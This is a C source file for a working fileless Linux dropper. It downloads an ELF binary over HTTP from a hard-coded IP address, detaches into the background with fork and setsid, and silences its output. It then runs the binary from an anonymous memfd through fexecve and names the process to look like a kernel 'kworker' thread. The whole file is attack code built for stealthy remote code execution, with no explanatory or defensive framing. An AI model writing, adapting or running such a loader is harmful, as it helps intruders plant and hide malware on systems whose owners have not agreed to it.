#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <curl/curl.h>

// Structure to hold the downloaded data in memory
struct MemoryBuffer {
    unsigned char *data;
    size_t size;
};

// Callback function for libcurl to write downloaded data into memory
size_t write_to_memory(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t total_size = size * nmemb;
    struct MemoryBuffer *mem = (struct MemoryBuffer *)userp;

    unsigned char *ptr = realloc(mem->data, mem->size + total_size);
    if (ptr == NULL) {
        fprintf(stderr, "Not enough memory to allocate buffer\n");
        return 0;
    }

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, total_size);
    mem->size += total_size;

    return total_size;
}

int main() {
    const char *url = "http://10.0.1.41:9000/hello"; // Replace with the actual URL containing the binary to execute

    // Initialize libcurl
    CURL *curl;
    CURLcode res;
    struct MemoryBuffer buffer = {0};

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize libcurl\n");
        curl_global_cleanup();
        exit(EXIT_FAILURE);
    }

    // Configure libcurl to download from the URL
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_memory);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&buffer);

    // Perform the download
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        exit(EXIT_FAILURE);
    }

    // Clean up libcurl
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    // Ensure we have received data
    if (buffer.size == 0 || buffer.data == NULL) {
        fprintf(stderr, "Failed to download ELF bytecode\n");
        free(buffer.data);
        exit(EXIT_FAILURE);
    }

    // Fork a new process
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        free(buffer.data);
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        // Parent process: exit immediately to detach from the child
        exit(EXIT_SUCCESS);
    }

    // Child process: detach from the parent
    if (setsid() < 0) { // Create a new session
        perror("setsid");
        free(buffer.data);
        exit(EXIT_FAILURE);
    }

    // Optionally, redirect standard input, output, and error to /dev/null
    int dev_null = open("/dev/null", O_RDWR);
    if (dev_null < 0) {
        perror("open /dev/null");
        free(buffer.data);
        exit(EXIT_FAILURE);
    }
    dup2(dev_null, STDIN_FILENO);
    dup2(dev_null, STDOUT_FILENO);
    dup2(dev_null, STDERR_FILENO);
    close(dev_null);

    // Create an anonymous in-memory file
    int fd = memfd_create(" \\_ [kworker/1:1-events]", MFD_CLOEXEC);
    if (fd == -1) {
        perror("memfd_create");
        free(buffer.data);
        exit(EXIT_FAILURE);
    }

    // Write the ELF binary to the in-memory file
    if (write(fd, buffer.data, buffer.size) == -1) {
        perror("write");
        close(fd);
        free(buffer.data);
        exit(EXIT_FAILURE);
    }

    // Reset the file offset to the beginning
    if (lseek(fd, 0, SEEK_SET) == -1) {
        perror("lseek");
        close(fd);
        free(buffer.data);
        exit(EXIT_FAILURE);
    }

    // Free the memory buffer as it is no longer needed
    free(buffer.data);

    // Execute the ELF binary using fexecve
    char *const argv[] = {" \\_ [kworker/1:1-events]", NULL};
    char *const envp[] = {NULL};
    if (fexecve(fd, argv, envp) == -1) {
        perror("fexecve");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Clean-up (unreachable if fexecve succeeds)
    close(fd);

    return 0;
}
